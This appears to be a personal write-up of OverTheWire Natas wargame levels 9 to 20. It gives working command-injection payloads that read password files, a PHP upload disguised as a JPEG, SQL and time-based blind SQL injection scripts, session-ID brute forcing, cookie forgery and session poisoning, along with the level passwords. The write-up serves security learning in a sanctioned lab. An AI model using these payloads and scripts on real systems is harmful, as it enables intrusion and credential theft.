## 9 needle in a haystack - nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

View the source to see it uses the input to set variable $key and issue this command:

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

It's sort of like sql injection, if you post this: `foo /dev/null; cat /etc/natas_webpass/natas9; wc -l` you get it to write the contents of /etc/natas_webpass/natas9 and you get the flag

## 10 filtered needle on a haystack - U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Same as before, but now they got a little smarter on linting the input:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

We can use dashes though, so just post this to bypass the linting: `-e ".*" /etc/natas_webpass/natas11`

## 11 In da Crib -

Key to solving this challenge is knowing that XOR crypts are vulnerable to KPA (Known Plaintext Attacks), such that:

plaintext XOR key = crypt_A
plaintext XOR crypt_A = key

Which is how we get the key that can be used to decrypt some other crypt_B.

Code shows it saves the cookie as such:

```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

And the cookie value is: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D

(I think the %3D in the end is an `=` html encoded)

The initial saved data is `$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`

So we might suppose that, in plaintext, this would be saved as `{"showpassword":"no","bgcolor":"#ffffff"}` (after being json_encoded).

Since it stores it base64 encoded as well, we need to first base64 decode the cookie value, but it yields something strange:

```
~ echo ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw= | base64 -d | hexdump -C
00000000  0a 55 4b 22 1e 00 48 2b  02 04 4f 25 03 13 1a 70  |.UK"..H+..O%...p|
00000010  53 19 57 68 5d 55 5a 2d  12 18 54 25 03 55 02 68  |S.Wh]UZ-..T%.U.h|
00000020  52 11 5e 2c 17 11 5e 68  0c                       |R.^,..^h.|
00000029
```

with lots of non ASCII characters, so I decided to try getting the result as plain hex:

```
~ echo ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw= | base64 -d | xxd -p
0a554b221e00482b02044f2503131a70531957685d555a2d121854250355
026852115e2c17115e680c
```

So now, we have the plaintext: `{"showpassword":"no","bgcolor":"#ffffff"}` and the XORed hex `0a554b221e00482b02044f2503131a70531957685d555a2d121854250355
026852115e2c17115e680c`

So, the key should be derived from doing plaintext XOR cypheredtext, by using their very same code.

```php
<?php

$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(json_encode($defaultdata), base64_decode($cookie));
?>
```

```
~ php -f xor-breaker.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

The repetitions are because of the convolution, but the key itself is the unique part, so: `qw8J`.

Now we need to use this key to generate the fake cookie that will get us to change the value of showpassword.

```php
$payload = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

echo base64_encode( xor_encrypt(json_encode($payload), "qw8J"));
echo "\n";
```

```
~ php -f xor-breaker.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Using this value as the new cookie and refreshing the page:

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## 12 jPHPeg - jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

In this challenge we are presented with an image upload form and again a view source link. By following the view source we can see that it does a bunch of useless stuff and eventually it does:

```php
echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
```

So, our main objective is to upload a php script that will echo the `/etc/natas_webpass/natas13` file for us.

```php
<html>
<body>
<?php
echo file_get_contents("/etc/natas_webpass/natas13")
?>
</body>
</html>
```

By first trying to upload a simple .jpeg image, we get, as expected:

> The file upload/rn0ydnnuad.jpg has been uploaded

And clicking the link loads up the `rn0ydnnuad.jpg` image. This filename is set by a hidden form field, so in order to get the file to be created with a .php extension, we will need to craft the request such that we can change the filename of the hidden field.

By using Firefox's "edit and resend" (which is most like a simplified burp suite) I was able to edit the filename into `foobar.php`, which ended up uploading the file as `upload/nseef0aqii.php` and requesting this path on the browser got me the flag: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY.

## 13 Magic Number - Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

This is the same as **12** but this time their code runs a verification on the file to check if it is an image.

```php
if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
  echo "File is not an image";
}
```

By googling you will find that `exif_imagetype` simply reads the 4 first bytes of the file, a.k.a. the **Magic Number** to confirm if it's an image or not.

That said, all we need to do is to create a malicious payload that contains the 4 first bytes mimicking that of a legit image.

```php
'\xFF\xD8\xFF\xE0' + '<? echo file_get_contents("/etc/natas_webpass/natas14"); ?>'
```

Let's do it with perl, just for the kicks.

```perl
perl -e 'open(fh, ">", "/tmp/natas14.php"); print fh "\xFF\xD8\xFF\xE0" . "<? echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>"; close(fh)'
```

And voila, works like a charm, we got the payload implanted.

```
For security reasons, we now only accept image files!

The file upload/o8grhpz1hw.php has been uploaded
```

## 14 sqli - AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

So this is a textbook bobby tables scenario (sql injection).

A form with username and password that is fed directly into a query. 

This time I want to take sometime to play around with some kali tools that probe for sqli in websites.

### Skipfish

Skipfish is a webcrawler that hunts for vulnerabilities. Running it against natas14, unsurprisingly, yielded 2 **High risk** findings (it attempted sqli once for each the username and password fields) for Query Injection Vector. The trace of which is below:

```
=== REQUEST ===

POST /index.php HTTP/1.1
Host: natas14.natas.labs.overthewire.org
Accept-Encoding: gzip
Connection: keep-alive
Range: bytes=0-399999
Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ==
User-Agent: sfish'"
Referer: sfish'"
Accept-Language: sfish'",en
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

username=Smith&password=skipfish'"
=== RESPONSE ===

HTTP/1.1 200 Partial Content
Date: Sun, 29 Mar 2020 22:02:52 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Range: bytes 0-488/489
Content-Length: 489
Keep-Alive: timeout=5, max=89
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<br />
<b>Warning</b>:  mysql_num_rows() expects parameter 1 to be resource, boolean given in <b>/var/www/natas/natas14/index.php</b> on line <b>24</b><br />
Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

=== END OF DATA ===
```

If this was more of a real scenario, it would have crawled up to 16 nested levels and attempted several probes (for varied types of vulnerabilities).

### pwning natas14

Anyways, let's move on and get done with this.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

so, if we pass in a username such as `bobbytables" or 1 = 1; -- ` it will yield the following query:

```sql
SELECT * from users where username="bobbytables" or 1 = 1; -- " and password="foo"
```

Pay attention to include a whitespace in the end after the `--`.

This breaks it and gets the flag:

```
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## 15 Bruteforcing sqli - WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

This is another sql injection vuln, but in this case we will need to bruteforce it into giving us the desired result.

When looking at the source for this challenge, it shows us the table structure.

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

The subject query is:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

We can craft the username in such way that this is queried:

```sql
SELECT * from users where username="natas16" and password like "a%"
```

And if that does not work, we go to:

```sql
SELECT * from users where username="natas16" and password like "b%"
```

And so on until we get an affirmative response.... of course doing this manually is not manegeable, so we will create a script to automate that... in perl 🤟.

```perl
#!/usr/bin/perl
use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;

my $url = 'http://natas15.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();

my $flag_found = 0;
my $flag = '';
my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');

while (!$flag_found) {
	for(my $char_index = 0; $char_index < @possible_characters; $char_index++) {
		my $char = $possible_characters[$char_index];
		my $temp_flag = $flag . $char;
		print "Attempting $temp_flag\n";
		my $payload = "natas16\" and password like binary \"$temp_flag%";

		my $request = POST $url, Content => [ username => $payload ];

		$request->authorization_basic('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J');

		my $response = $ua->request($request);
		if ($response->as_string() =~ /This user exists/i) {
			$flag .= $char;
			print "Got part of flag as $flag                   \n";
			last;
		}
	}

	if (length($flag) == 32) {
		$flag_found = 1;
	}
}

say $flag;
```

After a few minutes of bruteforcing, we get:

```
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## 16 First nightmare - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

This is similar to previous challenges, but with extra character filters and now they wrap `$key` in double quotes.

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```

If we send `.*" /etc/natas_webpass/natas17 "foo` we get:

```bash
grep -i ".*" /etc/natas_webpass/natas17 "foo" dictionary.txt
```

NOPE, we can't send double quotes...

Ok, so I cheated a bit and saw that this is another case for bruteforcing and the idea is to think in reverse: try and get the grep not to match when you actually match something.

So, since we can pass `$` and `()`, we can run commands inside that other grep like so:

```php
$key = "$(grep ^a /etc/natas_webpass/natas17)"
```

It turns the executed command into:

```bash
grep -i "$(grep ^a /etc/natas_webpass/natas17)"elephant dictionary.txt
```

If `/etc/natas_webpass/natas17` matches `/^a/` then the resulting command will be:

```bash
grep -i "aelephant" dictionary.txt
```

And if it does not begin with an `a` then it will not match, will be empty and the command will be

```bash
grep -i "aelephant" dictionary.txt
```

Which we know will match cause we know:

1. `elephant` is on the dictionary.
2. `alephant` is not.

So, to the batmobile!

```perl
#!/usr/bin/perl

use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;

my $url = 'http://natas16.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();


my $flag_found = 0;
my $flag = '';
my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');

while (!$flag_found) {
	for(my $char_index = 0; $char_index < @possible_characters; $char_index++) {
		my $char = $possible_characters[$char_index];
		my $temp_flag = $flag . $char;
		my $payload = "\$(grep ^$temp_flag /etc/natas_webpass/natas17)elephant";

		print "Attempting $temp_flag\n";

		my $request = POST $url, Content => [ needle =>  $payload ];
		 
		$request->authorization_basic('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh');
		 
		my $response = $ua->request($request);
		if ($response->as_string() !~ /elephant/i) {
			$flag .= $char;
			print "Got part of flag as $flag                   \n";
			last;
		}
	}

	if (length($flag) == 32) {
		$flag_found = 1;
	}
}

say $flag;
```

Alas, the flag is: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

## 17 - Time what is time? - xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

```php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

Time for a time based attack! Maybe...

This time there is a sql query, prone to injection, but there is no echo on the screen... so we don't know when we have a match or not - at least not visually!

I noticed that I could perhaps use the `timings` tab of the firefox developer tools to check for variance in time when I have a match (for example, `username=natas17`) and when I do not have a match (say, `username=asdfasdfadsf`).

```perl
#!/usr/bin/perl

use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;
use Benchmark::Timer;

my $url = 'http://natas17.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();

sub make_request {
	my $payload = shift;
	my $request = POST $url, Content => [ username => $payload ];
	$request->authorization_basic('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw');
	my $response = $ua->request($request);
}

 
sub run_bench_for {
	my $payload = shift;
	my $t = Benchmark::Timer->new(skip => 1);
	for(0 .. 20) {
			$t->start($payload);
			make_request($payload);
			$t->stop($payload);
	}
	print $t->report;
}

run_bench_for("natas18");
run_bench_for("asdfasdf");
```

And here is what I saw:

```
20 trials of natas18 (10.983s total), 549.156ms/trial
20 trials of asdfasdf (10.928s total), 546.406ms/trial
```

Crap... that does not seem to be the case.... but... what if we introduced the delay! So, I found out that doing sql injection without visual feedback is literally called blind sql injection. And that there are levels: from normal blind (in which you may not see something obvious on the page, but perhaps a response header or status will cue you) to totally blind in which there is absolutelly no difference.

So I searched for Totally Blind SQL injection and learned about MySQL's `sleep(n)` function and how we can use it to exploit stuff.

We can basically chain together logical predicates that will or will not include the delay and that is how you fly blind!

For example, re running the benchmark above but with payload as:

```perl
my $payload = "natas18\" and BINARY substring(password, $index, 1) = \"$char\" and sleep(2) #"
```

if the `$char` at `$index` of `password` matches, there will be a delay, if not, it will return fast.

But, the delay on the requests makes it slow to linearly break the pass via bruteforce here. So let's attempt a binary search style bruteforce. First we'll have to learn how mysql deals with string comparisons.

```sql
STRCMP(expr1,expr2)

STRCMP() returns 0 if the strings are the same, -1 if the first argument is smaller than the second according to the current sort order, and 1 otherwise.

mysql> SELECT STRCMP('text', 'text2');
        -> -1
mysql> SELECT STRCMP('text2', 'text');
        -> 1
mysql> SELECT STRCMP('text', 'text');
        -> 0
```

So, say we have these characters, in presumably ascending order:

```perl
my @possible_characters = split('', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz');
```

Using `strcmp` along with `substring` we can use binary search over the possible chars array to make discovery faster.

```perl
my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(5) #"
```

Then we can, for each of the 32 password characters:

1. set a `$lowerBound` and `$upperBound`, get the middle, which will yield a `$charIndex` and a `$char`.
2. evaluate if the `$payload` above causes the request to timeout (set a timout lower than the sleep, but fairly high).
3. if the request takes longer, it means the desired character is in the upper half of the array, so go back to #2, passing the upper half indices.
4. if, however, the request is fast, we will know that the next character is in fact in the lower half of the possible characters array. Go back to #1 passing the lower half indices.

And this was my implementation.

```perl
#!/usr/bin/perl
use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;
use Try::Tiny;

my $url = 'http://natas17.natas.labs.overthewire.org/index.php';
my $ua = LWP::UserAgent->new();
my @chars = split('', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz');

sub make_request_with {
	my ($index, $char) = @_;
  my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(5) #";

	my $request = POST $url, Content => [ username => $payload ];
	$request->authorization_basic('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw');
  $ua->timeout(4);
	my $response = $ua->request($request);
  die if $response->is_error;
}

sub get_passwd_char_at_index {
	my ($index, $lower_bound, $upper_bound) = @_;

  # recursive condition check
	return $chars[$lower_bound] if ($lower_bound > $upper_bound);

	my $char_index = int( ($lower_bound + $upper_bound) / 2 );

	try {
		make_request_with($index, $chars[$char_index]);
		return get_passwd_char_at_index($index, $lower_bound, $char_index - 1);
	} catch {
		# req timed out, so answer is on upper half
		return get_passwd_char_at_index($index, $char_index + 1, $upper_bound);
	}
}

print "Sploiting...\n";
# we know passwords are 32 in length, so
my $length = @chars;
my $flag = '';
foreach (1..32) {
	$flag .= get_passwd_char_at_index($_, 0, $length - 1);
  print "$flag\n";
}
```

Which resulted in:

```
% /overthewire-natas > master ● > perl bsf.pl
Sploiting...
x
xv
xvK
xvKI
xvKIq
xvKIqD
xvKIqDj
xvKIqDjy
xvKIqDjy4
xvKIqDjy4O
xvKIqDjy4OP
xvKIqDjy4OPv
xvKIqDjy4OPv7
xvKIqDjy4OPv7w
xvKIqDjy4OPv7wC
xvKIqDjy4OPv7wCR
xvKIqDjy4OPv7wCRg
xvKIqDjy4OPv7wCRgD
xvKIqDjy4OPv7wCRgDl
xvKIqDjy4OPv7wCRgDlm
xvKIqDjy4OPv7wCRgDlmj
xvKIqDjy4OPv7wCRgDlmj0
xvKIqDjy4OPv7wCRgDlmj0p
xvKIqDjy4OPv7wCRgDlmj0pF
xvKIqDjy4OPv7wCRgDlmj0pFs
xvKIqDjy4OPv7wCRgDlmj0pFsC
xvKIqDjy4OPv7wCRgDlmj0pFsCs
xvKIqDjy4OPv7wCRgDlmj0pFsCsD
xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

## Natas 18 - taking hostages

Natas18 was significantly simpler than Natas17, perhaps it's but an introduction to a harder level coming up.

Key here is also in the OWASP top10 and is related to [session highjacking](https://owasp.org/www-community/attacks/Session_hijacking_attack).

Looking at the code, we see our pot:

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

What this tells us is that if the current session storage has a key `"admin"` with value `1` then we're gold.

We can also see from the code that there is no straighforward way into tricking the code to force it to set this session variable for our current user's session.

HOWEVER, we can assume that an admin user did log in at some point in time and that his session is still lingering on the server, just waiting for the right cookie to come in.

From the code we see that it is starting sessions using:

```php
$maxid = 640; // 640 should be enough for everyone

# other stuff ...

function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}

# more stuff ...

function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
} 
```

Php's `session_start()` api states this:

> session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.

So if we send just the right cookie that makes it get the admin session and print the creds.

Since we don't know what the right cookie might be, we'll brute force it.

To the batmobile!

```bash
#!/bin/bash

num=1
pwned=0

while [[ $pwned = 0 ]]; do
  if [[ $num = 640 ]]; then echo "You messed somthing up..."; pwned=1; fi

  RESPONSE=$(curl 'http://natas18.natas.labs.overthewire.org/index.php' \
    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
    -H 'Referer: http://natas18.natas.labs.overthewire.org/' \
    -H "Cookie: PHPSESSID=$num" \
    --silent \
    --data 'username=admin&password=asdfasdf')

  honeypot='You are logged in as a regular user'
  if [[ "$RESPONSE" =~ $honeypot ]]; then
    echo "Attempt with $num failed"
    # echo $RESPONSE
  else
    echo "Succeeded with $num:"
    echo $RESPONSE
    pwned=1
  fi

  num=$((num+1))
done
```

And that gets us...

```
...
Attempt with 115 failed
Attempt with 116 failed
Attempt with 117 failed
Attempt with 118 failed
Succeeded with 119:
 You are an admin. The credentials for the next level are:<br><pre>Username: natas19 Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a hre </html>-source.html">View sourcecode</a></div>
```

## Natas 19 - John Nash Nazaré - seeing patterns

Natas19 is a slightly more complex variant of Natas18. It begins by stating:

> This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

And there is no `view source` button. Button we can assume that all is the same with the exception of the session id.

That said, my next step was to poke around and try and catch a glimpse of how the session ids are defined.

Logging in with username and pass testing, foobar (respectively), I got:

```
36342d74657374696e67
3333352d74657374696e67
3335372d74657374696e67
3538352d74657374696e67
3535342d74657374696e67
3130332d74657374696e67
37372d74657374696e67
3333352d74657374696e67
```

A couple of things to note here: there is an invariant suffix: `2d74657374696e67` and there was a repeated value `3333352d74657374696e67`.

That tells us two things: 

1. The varying part is not as broad as initially expected, and
2. the space in which it all varies is also not that broad.

However, the great insight here was noticing that all these look alot like ascii... so I attempted unpacking these as if they were ascii hex numbers, et voila:

```
perl -e 'print unpack("A*", "\x33\x33\x35\x2d\x74\x65\x73\x74\x69\x6e\x67");'                                                         1.97G RAM 
335-testing
```

My immediate thought was: ok, busted, it's exactly the same as the Natas18, with the same 640 rand ids, this time concatenated with `-username` and `| xxd -p`.

To validate, I tried logging in with username pass admin, foobar, got the cookie and:

```
printf '559-admin'|xxd -p                                                                                                             1.98G RAM 
3535392d61646d696e
```

Which matched.

So, enough chit-chat, to the Batmobile!

This is the same code as Natas18, with these only differences:

```diff
--- ../natas18/highjacker.sh    2020-04-10 16:48:59.000000000 -0300
+++ highjacker.sh       2020-04-10 17:46:33.000000000 -0300
@@ -6,11 +6,12 @@
 
 while [[ $pwned = 0 ]]; do
   if [[ $num = 640 ]]; then pwned=1; fi
+  hexnum=$(printf "$num-admin" | xxd -p)
 
-  RESPONSE=$(curl 'http://natas18.natas.labs.overthewire.org/index.php' \
-    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
-    -H 'Referer: http://natas18.natas.labs.overthewire.org/' \
-    -H "Cookie: PHPSESSID=$num" \
+  RESPONSE=$(curl 'http://natas19.natas.labs.overthewire.org/index.php' \
+    -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' \
+    -H 'Referer: http://natas19.natas.labs.overthewire.org/' \
+    -H "Cookie: PHPSESSID=$hexnum" \
     --silent \
     --data 'username=admin&password=asdfasdf')
```

And like so:

```
...
Attempt with 277 failed
Attempt with 278 failed
Attempt with 279 failed
Attempt with 280 failed
Succeeded with 281:
 </html> an admin. The credentials for the next level are:<br><pre>Username: natas20 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>script>
```

## Natas 20 - poison pill

Natas 20 is rather simple. From reading the source code we see many distractions, but the point of focus is the print_credentials method that shows us that if there is a session with key `admin` and value `1` the admin creds will be displayed.

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
```

 We also notice that the coder decided to implement the session loading and persistence on his own.

```php

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}
```

Where he is basically storing our name, POSTed from the on-page form, on a text file that holds session data, which on subsequent requests for the same session is reloaded by parsing through this text file.

The parsing itself is simple: one key val per line, so

```
key1 val1
key2 val2
...
```

Such that if we get to poison this text file with our `admin` key and `1` value we hit jackpot.

This attack consisted in three consecutive requests:

1. Creates a session for us (and that is why this time we use a Cookie jar on LWP::UserAgent->new, such that the following requests send session data along)
1. Send a malicious request that will poison the session persistence
1. Send any request that will read the poisoned session data and show us the admin creds.

```perl
#!/usr/bin/perl
use strict;
use warnings;
use v5.10;
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Cookies;
use Try::Tiny;

my $url = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1';
my $ua = LWP::UserAgent->new(
  cookie_jar => HTTP::Cookies->new()
);

sub make_request_with {
  my $request = POST $url, Content => [ name => shift ];
  $request->authorization_basic('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF');
  my $response = $ua->request($request);
  print $response->content;
}

# make first request to create session
make_request_with("foobar");

# make second request with malicious payload so poison session
make_request_with("foobar\nadmin 1");

# make third request to load poisoned session
make_request_with("foobar\nadmin 1");
```

Et voila:

```html
<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
```